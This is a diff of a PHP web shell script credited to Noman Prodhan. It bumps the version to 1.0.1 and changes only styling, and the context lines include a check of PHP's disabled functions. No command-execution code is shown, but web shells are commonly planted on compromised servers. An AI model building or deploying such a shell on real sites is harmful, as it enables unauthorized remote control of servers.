@@ -4,7 +4,7 @@
  * 
  * 
  *          Script Title    :   PHP WebShell
- *          Version         :   1.0
+ *          Version         :   1.0.1
  *          Author          :   Noman Prodhan
  *          Websites        :   www.nomantheking.com  www.nomanprodhan.com
  *          GitHub          :   https://github.com/NomanProdhan
@@ -47,7 +47,7 @@ function checkFunctions($param)
 <!DOCTYPE html>
 <head>
 
-<title>Web Shell Version 1.0 - Noman Prodhan</title>
+<title>Web Shell Version 1.0.1 - Noman Prodhan</title>
 <style type="text/css">
 * {
 	background: #5b3131;
@@ -56,7 +56,7 @@ function checkFunctions($param)
 .container {
 	margin: 0 auto;
 	width: 50%;
-	height: 650px;
+	height: 100% auto;
 	background: #263238;
 	box-shadow: 0 10px 16px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0
 		rgba(0, 0, 0, 0.19) !important;
@@ -76,12 +76,13 @@ function checkFunctions($param)
 .shell-sub-title {
 	background: #D81B60;
 	margin-top: 10px;
-	height: 5%;
+	height: 10%;
 	width: 100%;
+	overflow: scroll;
 	color: #fff;
 	font-family: Courier;
 	font-size: 14px;
-	text-align: center;
+	text-align: left;
 }
 
 span {
@@ -102,6 +103,7 @@ p {
 	font-family: Courier;
 	font-size: 14px;
 	margin-top: 1%;
+	padding-left: 10px;
 }
 
 .shell-body {
@@ -140,7 +142,7 @@ pre {
 	<div class="container">
 
 		<div class="shell-title">
-			<span>WebShell 1.0 by Noman Prodhan</span>
+			<span>WebShell 1.0.1 by Noman Prodhan</span>
 		</div>
 		<?php if(!empty(ini_get("disable_functions"))){ ?>
 		
